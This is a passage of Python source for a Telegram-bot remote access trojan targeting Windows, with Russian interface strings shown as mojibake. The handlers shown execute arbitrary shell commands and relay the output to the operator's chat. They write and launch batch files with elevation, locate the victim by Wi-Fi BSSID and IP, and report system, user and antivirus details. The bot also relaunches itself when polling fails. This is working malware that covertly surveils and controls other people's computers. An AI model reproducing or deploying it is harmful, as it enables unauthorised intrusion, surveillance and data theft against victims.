			bot.reply_to(command, '_–î–∏—Å–∫–æ–≤–æ–¥ –±—ã–ª –∑–∞–∫—Ä—ã—Ç!_', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id, 
			'_–í—ã–±–µ—Ä–∏—Ç–µ –≤–∞—Ä–∏–∞–Ω—Ç_'
			'\n'
			'\n*‚Ä∫ /DVD*'
			'\n'
			'\n_–í–∞—Ä–∏–∞–Ω—Ç—ã_'
			'\n'
			'\n`–û—Ç–∫—Ä—ã—Ç—å` / `–ó–∞–∫—Ä—ã—Ç—å`',
				parse_mode='Markdown')


# –£–¥–∞–ª–µ–Ω–Ω–æ–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã (CMD)

@bot.message_handler(regexp='/CMD')
def CMD(command):
	try:

		Command = re.split('/CMD ', command.text, flags=re.I)[1]
		CMD = subprocess.Popen(Command,
			shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

		Lines = []
		for Line in CMD.stdout.readlines():
			Line = Line.strip()
			if Line:
				Lines.append(Line.decode('cp866'))
				Output = '\n'.join(Lines)

		bot.send_message(command.chat.id, Output)

	except:
		try:

			Command = re.split('/CMD ', command.text, flags=re.I)[1]
			SplittedText = telebot.util.split_string(Output, 4096)
			for Output in SplittedText:

				bot.send_message(command.chat.id, Output)

		except UnboundLocalError:
			bot.reply_to(command, '_–ö–æ–º–∞–Ω–¥–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞!_', parse_mode='Markdown')

		except:
			bot.send_message(command.chat.id, '_–í–≤–µ–¥–∏—Ç–µ –≤–∞—à—É –∫–æ–º–∞–Ω–¥—É_\n\n*‚Ä∫ /CMD*', parse_mode='Markdown')


# –£–¥–∞–ª–µ–Ω–Ω–æ–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–º–∞–Ω–¥ (BAT)

@bot.message_handler(regexp='/BAT')
def BAT(command):
	try:

		Command = re.split('/BAT ', command.text, flags=re.I)[1]	
		File = Directory + 'Command.bat'
		BatchFile = open(File, 'w').write(Command)
	
		if Admin() is False:
			os.startfile(File)
	
		if Admin() is True:
			os.startfile(File, 'runas')

		bot.reply_to(command, '_–ö–æ–º–∞–Ω–¥–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞!_', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id, '_–í–≤–µ–¥–∏—Ç–µ —Å–≤–æ—é –∫–æ–º–∞–Ω–¥—É_\n\n*‚Ä∫ /BAT*', parse_mode='Markdown')


# –ü–æ–ª—É—á–µ–Ω–∏–µ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏—è –ø–æ BSSID

@bot.message_handler(regexp='/Location')
def Location(command):
	try:

		bot.send_chat_action(command.chat.id, 'find_location')
		Coordinates = GetLocationByBSSID(GetMacByIP())
		Latitude = Coordinates['lat']
		Longitude = Coordinates['lon']
		bot.send_location(command.chat.id, Latitude, Longitude)
		bot.send_message(command.chat.id,
			'_ –ú–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ_'
			'\n'
			'\n*IP –ê–¥—Ä–µ—Å—Å* ¬ª `' + Geolocation('query') + '`' +
			'\n*–°—Ç—Ä–∞–Ω–∞* ¬ª `' + Geolocation('country') + '`' +
			'\n*–ì–æ—Ä–æ–¥* ¬ª `' + Geolocation('city') + '`' +
			'\n'
			'\n*–®–∏—Ä–æ—Ç–∞* ¬ª `' + str(Coordinates['lat']) + '`' +
			'\n*–î–æ–ª–≥–æ—Ç–∞* ¬ª `' + str(Coordinates['lon']) + '`' +
			'\n*–î–∏–∞–ø–∞–∑–æ–Ω* ¬ª `' + str(Coordinates['range']) + '`' +
			'\n'
			'\n*BSSID* ¬ª `' + GetMacByIP() + '`',
				parse_mode='Markdown') 

	except:
		bot.send_message(command.chat.id,
			'_–ù–µ —É–¥–∞–ª–æ—Å—å –Ω–∞–π—Ç–∏ —Ü–µ–ª—å –ø–æ BSSID_'
			'\n'
			'\n*IP –ê–¥—Ä–µ—Å* ¬ª `' + Geolocation('query') + '`' +
			'\n*–°—Ç—Ä–∞–Ω–∞* ¬ª `' + Geolocation('country') + '`' +
			'\n*–ì–æ—Ä–æ–¥* ¬ª `' + Geolocation('city') + '`' +
			'\n'
			'\n*BSSID* ¬ª `' + GetMacByIP() + '`',
				parse_mode='Markdown') 


# –°–∏—Å—Ç–µ–º–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è

@bot.message_handler(regexp='/Info')
def Info(command):
	try:

		bot.send_chat_action(command.chat.id, 'typing')
		bot.send_message(command.chat.id, 
			'\n_–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–∫_'
			'\n'
			'\n*–í–µ—Ä—Å–∏—è –û–°* ¬ª `' + Windows() + '`' +
			'\n*–ù–∞–∑–≤–∞–Ω–∏–µ –∫–æ–º–ø—å—é—Ç–µ—Ä–∞* ¬ª `' + str(Computer('ComputerSystem', 'Name')) + '`' +
			'\n*–ú–æ–¥–µ–ª—å –∫–æ–º–ø—å—é—Ç–µ—Ä–∞* ¬ª `' + str(Computer('ComputerSystem', 'Model')) + '`' +
			'\n*–ü—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å* ¬ª `' + str(Computer('ComputerSystem', 'Manufacturer')) + '`' +
			'\n*–°–∏—Å—Ç–µ–º–Ω–æ–µ –≤—Ä–µ–º—è* ¬ª `' + SystemTime() + '`' +
			'\n*–ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è* ¬ª `' + os.getlogin() + '`' +
			'\n'
			'\n'
			'\n_–ñ–µ–ª–µ–∑–æ_'
			'\n'
			'\n*CPU* ¬ª `' + str(Computer('CPU', 'Name')) + '`' +
			'\n*GPU* ¬ª `' + str(Computer('path Win32_VideoController', 'Name')) + '`' +
			'\n*RAM* ¬ª `' + str(RAM()) + '`' +
			'\n*ARM* ¬ª `' + platform.architecture()[0] + '`' +
			'\n'
			'\n'
			'\n_–ó–∞—â–∏—Ç–∞_'
			'\n'
			'\n*–ó–∞–ø—É—â–µ–Ω–æ —Å –ø—Ä–∞–≤–∞–º–∏ –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞* ¬ª `' + str(Admin())+ '`' +
			'\n*–ó–∞—â–∏—â–µ–Ω –ª–∏ –ø—Ä–æ—Ü–µ—Å—Å (–≤ –∫–æ–Ω—Ñ–∏–≥–µ)* ¬ª `' + str(ProcessBSODProtectionEnabled) + '`' +
			'\n*–£—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã–µ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å—ã* ¬ª `' + Antivirus[0] + '`',
				parse_mode='Markdown')

	except:
		pass

# –ù–∞–≤–∏–≥–∞—Ü–∏–æ–Ω–Ω—ã–µ –∫–Ω–æ–ø–∫–∏

@bot.message_handler(commands=['3', '6'])
def Main(command):
	bot.send_message(command.chat.id, '`...`', reply_markup=menu, parse_mode='Markdown')

@bot.message_handler(commands=['2', '5'])
def Main(command):
	bot.send_message(command.chat.id, '`...`', reply_markup=main5, parse_mode='Markdown')

@bot.message_handler(commands=['4', '1'])
def Main(command):
	bot.send_message(command.chat.id, '`...`', reply_markup=main8, parse_mode='Markdown')

@bot.message_handler(commands=['Power', 'power'])
def Power(command):
	bot.send_message(command.chat.id, '_–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ_', reply_markup=main2, parse_mode='Markdown')

@bot.message_handler(commands=['Autorun', 'autorun'])
def Autorun(command):
	bot.send_message(command.chat.id, '_–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ_', reply_markup=main3, parse_mode='Markdown')

@bot.message_handler(commands=['Files', 'files'])
def Files(command):
	bot.send_message(command.chat.id, '`...`', reply_markup=main7, parse_mode='Markdown')

@bot.message_handler(commands=['Cancel'])
def CancelFiles(command):
	bot.send_message(command.chat.id, '`...`', reply_markup=main5, parse_mode='Markdown')

@bot.message_handler(commands=['Wallpapers', 'wallpapers'])
def Wallpapers(command):
	bot.send_message(command.chat.id, '_–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏—é, –∫–æ—Ç–æ—Ä—É—é –≤—ã —Ö–æ—Ç–∏—Ç–µ —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –Ω–∞ –æ–±–æ–∏_', parse_mode='Markdown')


try:
	bot.polling(none_stop=True)
except:
	os.startfile(CurrentPath)
	sys.exit()
